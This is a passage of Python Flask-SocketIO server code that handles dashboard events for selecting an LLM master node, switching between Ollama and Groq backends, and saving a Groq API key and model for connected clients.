        tcp_server.send_message(old_master, CLEAR_MASTER_URL_CMD)
        tcp_server.broadcast_command_to_all(CLEAR_MASTER_URL_CMD, exclude_client=old_master)
        tcp_server.master_info = None
        tcp_server._save_config()
        notify_web('master_info', None)
    tcp_server.send_message(client_id, SETUP_LLM_PREFIX)
    notify_web('log', f'LLM Master setup initiated for {client_id}')

@socketio.on('deselect_master')
def handle_deselect_master():
    if not tcp_server or not tcp_server.master_info:
        return
    tcp_server.broadcast_command_to_all(CLEAR_MASTER_URL_CMD)
    tcp_server.master_info = None
    tcp_server._save_config()
    notify_web('master_info', None)
    notify_web('log', 'LLM Master deselected')

@socketio.on('set_backend')
def handle_set_backend(data):
    if not tcp_server or not tcp_server.running:
        return
    mode = data.get('backend')
    if mode in ('ollama', 'groq'):
        tcp_server.set_backend_mode(mode)

@socketio.on('save_groq_config')
def handle_save_groq_config(data):
    api_key = data.get('api_key', '').strip()
    model = data.get('model', '').strip()
    if not api_key:
        notify_web('log', 'Groq API key cannot be empty')
        return
    if not model:
        model = 'llama-3.3-70b-versatile'
    if tcp_server:
        tcp_server.groq_config['api_key'] = api_key
        tcp_server.groq_config['model'] = model
        tcp_server._save_config()
        if tcp_server.backend_mode == 'groq':
            for cid in list(tcp_server.client_ids):
                tcp_server.send_message(cid, f"!MODE_GROQ {api_key} {model}")
        notify_web('log', 'Groq configuration saved')
        notify_web('backend_mode', tcp_server.backend_mode)
    else:
        config = load_server_config()
        config['groq']['api_key'] = api_key
        config['groq']['model'] = model
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=2)
        socketio.emit('log', 'Groq configuration saved (server offline)')
        socketio.emit('backend_mode', config['backend'])

if __name__ == '__main__':
    print(f"Web server listening at http://{WEB_HOST}:{WEB_PORT}")
    socketio.run(app, host=WEB_HOST, port=WEB_PORT, debug=False, allow_unsafe_werkzeug=True)